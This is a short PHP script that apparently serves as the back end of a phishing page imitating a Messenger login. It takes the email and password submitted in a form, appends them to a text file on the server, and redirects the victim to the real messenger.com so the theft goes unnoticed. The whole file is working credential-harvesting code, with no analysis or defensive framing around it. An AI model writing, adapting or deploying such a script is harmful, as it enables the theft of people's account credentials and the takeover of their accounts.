<?php

file_put_contents("../ibrahem.txt", "  " . $_POST['email'] . "  :  " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:https://www.messenger.com/');
exit();
